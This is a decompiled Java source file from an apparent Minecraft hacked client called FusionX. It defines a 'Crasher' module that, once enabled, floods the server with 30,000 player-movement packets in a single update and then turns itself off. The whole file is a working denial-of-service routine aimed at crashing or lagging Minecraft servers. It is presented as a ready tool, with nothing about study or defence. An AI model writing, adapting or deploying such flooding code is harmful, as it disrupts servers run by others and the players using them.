// 
// Decompiled by Procyon v0.5.30
// 

package me.CheerioFX.FusionX.module.modules;

import net.minecraft.network.Packet;
import me.CheerioFX.FusionX.utils.NetUtils;
import net.minecraft.network.play.client.C03PacketPlayer;
import me.CheerioFX.FusionX.module.Category;
import me.CheerioFX.FusionX.module.Module;

public class Crasher extends Module
{
    public Crasher() {
        super("Crasher", 0, Category.SERVER);
    }
    
    @Override
    public void onEnable() {
        super.onEnable();
    }
    
    @Override
    public void onDisable() {
        super.onDisable();
    }
    
    @Override
    public void onUpdate() {
        if (this.getState()) {
            for (int i = 0; i < 30000; ++i) {
                NetUtils.sendPacket(new C03PacketPlayer());
            }
            this.toggleModule();
        }
    }
}
